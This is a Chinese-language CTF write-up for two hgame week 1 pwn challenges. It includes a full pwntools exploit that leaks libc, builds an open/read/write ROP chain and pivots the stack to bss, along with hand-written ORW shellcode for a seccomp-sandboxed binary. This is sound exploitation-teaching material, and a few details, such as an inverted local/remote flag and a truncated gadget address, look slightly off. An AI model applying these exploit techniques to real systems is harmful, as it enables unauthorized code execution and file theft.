      v5 = 0;
      v6 = 0;
      v7 = 21;
      v8 = 2;
      v9 = 0;
      v10 = 59;
      v11 = 21;
      v12 = 1;
      v13 = 0;
      v14 = 322;
      v15 = 6;
      v16 = 0;
      v17 = 0;
      v18 = 2147418112;
      v19 = 6;
      v20 = 0;
      v21 = 0;
      v22 = 0;
      v1 = 5;
      v2 = &v3;
      prctl(38, 1LL, 0LL, 0LL, 0LL);
      return prctl(22, 2LL, &v1);
    }
##### seccomp-tools识别沙盒
可以看到限制了execve的系统调用
##### 思路
  * 限制execve的系统调用，所以使用open read write
  * 又因为只溢出了0x30的字节，然后中间还有8字节的pre ebp
  * 所以只有0x28的字节可以利用，空间太小没法open read write
  * 所以使用栈迁移  
##### 构造gadget
  * 这里用bss段构造，但是不能用bss段的起始位置，好像是因为把栈转移到这个地方后，会自动向下(低地址）处申请一块空间作为栈的部分，但bss段的低地址处的数据是很重要的，不能被改变，改变程序就会崩溃，所以此时用的地址一般是bss的起始位置加上一个比较大的数
  * 所以buf=elf.bss()+0x150
  * 这里是先构造了一段rop链(gets(buf))以便于在buf处写入东西
  * 然后构造open read write
  * open('buf+0x88',0)
  * read(3,buf+0x90,0x100) 第一次打开文件用3
  * puts(buf+0x90)  
##### buf  
经计算得到buf的地址为0x4041b0
从ida上看，这个地址已经超出了bss段的地址
但这一段依然可读可写可执行，所以应该是在data段
##### orw
    payload=p64(pop_rdi)+p64(buf+0x88)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(open)
    payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(buf+0x90)+p64(0)
    payload+=p64(pop_rdx)+p64(0x100)+p64(read)
    payload+=p64(pop_rdi)+p64(buf+0x90)+p64(puts_plt)+b'flag\x00aaa'
这里flag字符串是自己写入的，open读取这个位置的flag，然后read在下个地址把它读入，最后puts输出flag
##### 栈迁移
  * payload=cyclic(0x100)+p64(buf-0x8)+p64(leave_ret)
  * 迁移到buf的上个低地址处
  * leave_ret随便从一个函数后面找一个就行
##### exp
    from pwn import *
    context(os="linux",arch="amd64",log_level='debug')
    elf=ELF("./stack_pivoting")
    libc=ELF("./libc-2.31.so")
    local=1
    if local==1:
        io=remote('week-1.hgame.lwsec.cn',30891)
    else:
        io=process("./stack_pivoting")
    def duan():
        gdb.attach(io)
        pause()
    pop_rdi=0x401393
    pop_rsi_r15=0x401391
    puts_plt=elf.plt['puts']
    puts_got=elf.got['puts']
    start=elf.symbols['_start']
    read=elf.plt['read']
    payload=cyclic(0x100+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
    io.sendafter(b'task.\n',payload)
    puts_got=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
    libc_base=puts_got-libc.symbols['puts']
    print('libc_base-->'+hex(libc_base))
    buf=elf.bss()+0x150
    gets=libc_base+libc.symbols['gets']
    payload=cyclic(0x100+0x8)+p64(pop_rdi)+p64(buf)+p64(gets)+p64(start)
    io.sendafter(b'task.\n',payload)
    open=libc_base+libc.symbols['open']
    pop_rdx=libc_base+0x142c92
    #open('buf+0x88',0)
    #read(3,buf+0x90,0x100)  第一次打开文件用3
    #puts(buf+0x90)
    payload=p64(pop_rdi)+p64(buf+0x88)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(open)
    payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(buf+0x90)+p64(0)
    payload+=p64(pop_rdx)+p64(0x100)+p64(read)
    payload+=p64(pop_rdi)+p64(buf+0x90)+p64(puts_plt)+b'flag\x00aaa'
    io.sendline(payload)
    leave_ret=0x4012e
    payload=cyclic(0x100)+p64(buf-0x8)+p64(leave_ret)
    io.sendafter(b'task.\n',payload)
    io.recv()
    '''
    0x000000000040138c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040138e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000401390 : pop r14 ; pop r15 ; ret
    0x0000000000401392 : pop r15 ; ret
    0x000000000040138b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040138f : pop rbp ; pop r14 ; pop r15 ; ret
    0x000000000040117d : pop rbp ; ret
    0x0000000000401393 : pop rdi ; ret
    0x0000000000401391 : pop rsi ; pop r15 ; ret
    0x000000000040138d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040101a : ret
    0x00000000004012a8 : ret 0x2be
    '''
# orw和ret2shellcode
#### hgame week1 simple_shellcode
##### checksec
保护全开
##### ida
##### seccomp-tools识别沙盒
##### 思路
mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL)  
这里的mmap应该是向0xCAFE0000LL申请了一段0x1000uLL的空间，7代表可读可写可执行  
因为read只读入0x10个字节，空间太小
  * 也可以看到后面调用了rdx，所以可以通过改变rdx再次调用read
  * 然后就在原来read函数读入地址的后面去写入shellcode
  * 64位下read的系统调用号是0
  * read(0,0x0xCAFE0010+0xxxx,0x1000)
  * rax=0,rdi=0,rsi=0x0xCAFE0010+0xxxx,rdx=0x1000  
##### gdb  
直接断在地址上  
应该是出了什么错误  
调试到call rdx的位置看看
    AX  0x0
     RBX  0x5555555553d0 (__libc_csu_init) ◂— endbr64 
     RCX  0x7ffff7ee1d3e (prctl+14) ◂— cmp rax, -0xfff
     RDX  0xcafe0000 ◂— 0xa6e /* 'n\n' */
     RDI  0x16
     RSI  0x2
     R8   0x0
     R9   0x0
     R10  0x7ffff7ee1d3e (prctl+14) ◂— cmp rax, -0xfff
     R11  0x217
     R12  0x555555555100 (_start) ◂— endbr64 
     R13  0x7fffffffe060 ◂— 0x1
     R14  0x0
     R15  0x0
     RBP  0x7fffffffdf70 ◂— 0x0
     RSP  0x7fffffffdf60 —▸ 0x7fffffffe060 ◂— 0x1
     RIP  0x5555555553b9 (main+131) ◂— call rdx
所以写一下汇编
  * read(0,0x0xCAFE0010+0xxxx,0x1000)
  * rax=0,rdi=0,rsi=0x0xCAFE0010+0xxxx,rdx=0x1000
  * RAX 0x0
  * RDI 0x16
  * RSI 0x2
  * RDX 0xcafe0000 
        shellcode=asm('''
     mov rdi,rax;
     mov rsi,0xCAFE0010;
     syscall;
     nop;
     ''')
##### orw
        shellcode= asm('''
     push 0x67616c66
     mov rdi,rsp
     xor esi,esi
     push 2
     pop rax
     syscall
     mov rdi,rax
     mov rsi,rsp
     mov edx,0x100
     xor eax,eax
     syscall
     mov edi,1
     mov rsi,rsp
     push 1
     pop rax
     syscall
     ''')
##### exp
        shellcode= asm('''
     push 0x67616c66
     mov rdi,rsp
     xor esi,esi
     push 2
     pop rax
     syscall
     mov rdi,rax
     mov rsi,rsp
     mov edx,0x100
     xor eax,eax
     syscall
     mov edi,1
     mov rsi,rsp
     push 1
     pop rax
     syscall
     ''')